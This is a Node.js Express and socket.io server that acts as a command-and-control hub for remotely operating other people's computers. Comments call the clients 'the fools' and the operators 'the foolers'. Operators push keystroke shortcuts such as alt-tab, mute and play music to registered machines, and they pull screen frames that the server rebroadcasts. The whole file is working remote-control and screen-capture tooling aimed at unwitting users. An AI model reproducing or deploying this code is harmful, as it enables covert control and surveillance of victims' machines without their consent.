const express = require('express');
const http = require('http');
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// config
const COMMAND_DELAY = 0;
const PORT = 9999

// modifier can be [alt, command, control, shift]
const ACTIONS = new Map();
ACTIONS.set('TAB', {key: 'tab', modifier: ['alt']});
ACTIONS.set('MUTE', {key: 'm', modifier: ['control', 'shift']});
ACTIONS.set('PLAY_MUSIC', {key: 'audio_play', modifier: []});


let clients = []; // the fools
let commanders = []; // the foolers

// serve the command center
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// socket events
io.on('connection', (socket) => {
    console.log(`Connection: ${socket.id}`);

    socket.on("disconnect", (reason) => {
        console.log(`${socket.id} disconnected because ${reason}`);
        clients = clients.filter(e => e.id !== socket.id);
        commanders = commanders.filter(e => e !== socket.id);
    });

    socket.on('register-commander', () => {
        commanders.push(socket.id);
        socket.emit('actions', Array.from(ACTIONS.keys()));
        setInterval(() => {
            socket.emit('users', clients);
        }, 1000);
    });

    socket.on('register', data => {
        console.log(data.fingerprint);
        clients.push({
            id: socket.id,
            data
        });
    });

    socket.on('action', ({action, id}) => {
        setTimeout(() => {
            io.to(id).emit('command', ACTIONS.get(action));
        }, COMMAND_DELAY);
    });

    socket.on('request-frame', data => {
        io.to(data.id).emit('request-frame');
    });

    socket.on('frame', data => {
        io.emit('frame', data.img);
    });

    socket.on("startup", () => {
        console.log('Client script has been started: ', socket.id);
    });

    socket.on("error", data => {
        console.error('ERROR', data);
    });
});

// start the server
server.listen(PORT, () => {
    console.log(`listening on *:${PORT}`);
});